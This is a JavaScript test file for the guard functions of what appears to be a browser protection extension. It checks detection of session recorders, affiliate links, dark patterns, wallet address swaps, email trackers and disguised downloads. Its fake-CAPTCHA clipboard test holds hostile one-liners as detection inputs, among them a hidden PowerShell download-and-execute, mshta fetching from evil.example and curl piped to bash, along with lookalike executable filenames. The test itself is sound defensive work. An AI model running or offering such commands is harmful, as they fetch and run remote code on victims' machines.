import { test } from 'node:test';
import assert from 'node:assert/strict';
import { addressKind, addressSwap, affiliateNetwork, commandIn, darkPatternFlags, dateNote, disguisedDownload, emailTracker, gmailOriginal, parseDate, replayVendor, SCARCITY, SHAMING, unwrap } from '../src/shared/guards.js';

test('session recorders are named by their script host', () => {
  assert.equal(replayVendor('https://static.hotjar.com/c/hotjar-1.js'), 'Hotjar');
  assert.equal(replayVendor('https://edge.fullstory.com/s/fs.js'), 'FullStory');
  assert.equal(replayVendor('https://www.clarity.ms/tag/abc'), 'Microsoft Clarity');
  assert.equal(replayVendor('https://cdn.example.com/app.js'), null);
  assert.equal(replayVendor('https://notfullstory.com/x.js'), null);
});

test('affiliate links are told apart from plain ones', () => {
  assert.equal(affiliateNetwork('https://www.amazon.com/dp/B0?tag=site-20'), 'Amazon');
  assert.equal(affiliateNetwork('https://www.amazon.co.uk/dp/B0'), null);
  assert.equal(affiliateNetwork('https://amzn.to/3xyz'), 'Amazon');
  assert.equal(affiliateNetwork('https://go.skimresources.com/?id=1&url=x'), 'Skimlinks');
  assert.equal(affiliateNetwork('https://bestbuy.7tiv.net/c/1'), 'Impact');
  assert.equal(affiliateNetwork('https://example.com/shop'), null);
});

test('old stories are dated plainly; fresh ones say nothing', () => {
  const now = Date.UTC(2026, 9, 20);
  assert.equal(dateNote({ published: Date.UTC(2026, 3, 1) }, now), null);
  const old = dateNote({ published: Date.UTC(2019, 2, 12), modified: Date.UTC(2026, 9, 19) }, now);
  assert.match(old.text, /^Published Mar 12, 2019, 7 years ago; updated 1 day ago\.$/);
  assert.equal(old.stale, true);
  assert.equal(dateNote({ published: Date.UTC(2025, 5, 1) }, now).stale, false);
  assert.equal(parseDate('not a date'), null);
  assert.equal(parseDate('2019-03-12T08:00:00Z'), Date.UTC(2019, 2, 12, 8));
});

test('dark patterns', () => {
  assert.ok(SCARCITY.test('Hurry! Only 3 left in stock'));
  assert.ok(SCARCITY.test('14 people are viewing this'));
  assert.ok(SHAMING.test("No thanks, I don't like saving money"));
  assert.ok(!SHAMING.test('No thanks'));
  const flags = darkPatternFlags({ timers: 1, scarcity: ['Only 3 left'], prechecked: ['Add shipping insurance'], shaming: [] });
  assert.deepEqual(flags.map((f) => f.kind), ['dark:timer', 'dark:scarcity', 'dark:prechecked']);
});

test('clipboard commands from fake CAPTCHAs are caught; ordinary text is not', () => {
  assert.ok(commandIn('powershell -w hidden -c "iwr http://x/a.ps1 | iex"'));
  assert.ok(commandIn('mshta https://evil.example/verify.hta # I am not a robot'));
  assert.ok(commandIn('curl -s https://x.example/i.sh | bash'));
  assert.ok(commandIn('cmd /c start /min powershell'));
  assert.equal(commandIn('Meet you at 7 for dinner'), null);
  assert.equal(commandIn('npm install left-pad'), null);
});

test('wallet address swaps', () => {
  const a = '0x52908400098527886E0F7030069857D2E4169EE7';
  const b = '0x5290aaaa098527886E0F7030069857D2E4169EE7';
  assert.equal(addressKind(a), 'Ethereum-style');
  assert.equal(addressKind('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'), 'Bitcoin');
  assert.equal(addressKind('hello world'), null);
  assert.equal(addressSwap(a, a), null);
  const swap = addressSwap(a, b);
  assert.equal(swap.lookalike, true);
  assert.match(swap.text, /isn't the one you copied/);
});

test('redirect wrappers unwrap to the real destination', () => {
  assert.equal(unwrap('https://www.google.com/url?q=https://example.org/a&sa=U'), 'https://example.org/a');
  assert.equal(unwrap('https://l.facebook.com/l.php?u=https%3A%2F%2Fexample.org%2Fb&h=x'), 'https://example.org/b');
  assert.equal(unwrap('https://www.youtube.com/redirect?q=https://example.org/c&v=1'), 'https://example.org/c');
  assert.equal(unwrap('https://disq.us/url?url=https%3A%2F%2Fexample.org%2Fd%3Axyz'), 'https://example.org/d');
  assert.equal(unwrap('https://www.google.com/url?q=javascript:alert(1)'), null);
  assert.equal(unwrap('https://example.org/url?q=https://x.org'), null);
});

test('disguised downloads', () => {
  assert.match(disguisedDownload('invoice.pdf.exe'), /looks like a document but is a program/);
  assert.match(disguisedDownload('photo‮gpj.scr'), /text-direction/);
  assert.match(disguisedDownload('report.docx        .js'), /./);
  assert.equal(disguisedDownload('setup.exe'), null);
  assert.equal(disguisedDownload('notes.pdf'), null);
});

test('email trackers, including behind the Gmail image proxy', () => {
  assert.equal(emailTracker('https://example.us1.list-manage.com/track/open.php?u=1'), 'Mailchimp');
  assert.equal(gmailOriginal('https://ci3.googleusercontent.com/meips/AD#https://mailtrack.io/trace/mail/abc.png'), 'https://mailtrack.io/trace/mail/abc.png');
  assert.equal(emailTracker(gmailOriginal('https://ci3.googleusercontent.com/x#https://mailtrack.io/t.png')), 'Mailtrack');
});

test('modes set visibility; overrides win; protection is on everywhere', async () => {
  const { effectiveGuards } = await import('../src/shared/modes.js');
  assert.equal(effectiveGuards({}).mode, 'balanced');
  assert.equal(effectiveGuards({ mode: 'quiet' }).affiliateMarks, false);
  assert.equal(effectiveGuards({ mode: 'quiet' }).clipboard, true);
  assert.equal(effectiveGuards({ mode: 'watchful' }).badgeCount, true);
  assert.equal(effectiveGuards({ mode: 'quiet', guards: { affiliateMarks: true } }).affiliateMarks, true);
  assert.equal(effectiveGuards({ mode: 'nonsense' }).mode, 'balanced');
});
